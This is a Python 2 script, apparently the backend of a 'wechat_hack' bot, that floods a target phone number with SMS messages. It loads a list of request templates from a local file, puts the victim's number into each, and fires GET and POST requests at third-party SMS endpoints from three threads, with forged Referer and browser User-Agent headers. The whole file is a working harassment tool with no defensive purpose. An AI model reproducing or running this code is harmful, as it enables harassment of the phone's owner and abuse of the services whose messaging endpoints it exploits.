#! /usr/bin/python
# -*- coding: utf-8 -*-
import requests
from re import sub, split
import threading
import time

m = list()
def attack_post(mtfly):
    url = mtfly[1]
    mtfly[2] = split('&',mtfly[2])
    dics = {}
    for i in range(len(mtfly[2])):
        mtfly[2][i] = split('=', mtfly[2][i])
        dics.setdefault(mtfly[2][i][0], mtfly[2][i][1])
    payload = dics
    #print payload
    headers = {'Referer': mtfly[3],
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac;'}
    try:
        requests.post(url, data=payload, headers=headers)
        print 'post success!'
    except Exception,e:
        print e
        print 'post fail!'
        
def attack_get(mtfly):
    url = mtfly[1]
    headers = {'Referer': mtfly[3],
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac;'}
    try:
        requests.get(url,headers=headers)
        print 'get success!'
    except Exception,e:
        print e
        print 'get fail!'    
        
def attack(m):
    for mi in m:
    	mtfly = split('::|\n', mi)
    
    	#print mtfly[0] 
    	if mtfly[0] == 'get':
	    attack_get(mtfly)
	elif mtfly[0] == 'post':
	    attack_post(mtfly)
	time.sleep(3)
def t_attack(m):
    threads = []
    nloops = range(0,3)
    for i in nloops:        
        t = threading.Thread(target=attack, args=(m,))
        threads.append(t)
    for i in nloops:
        threads[i].start()

def sendSMS(phone):
    f = open('/root/wechat_hack/wechat/mode/mtfly.txt', 'r')
    for eachLine in f.readlines():
        eachLine = sub('phone_number', phone, eachLine)
        eachLine = eachLine.strip()
        m.append(eachLine)
    t_attack(m)
    return 'working on it! wait for a moment.'
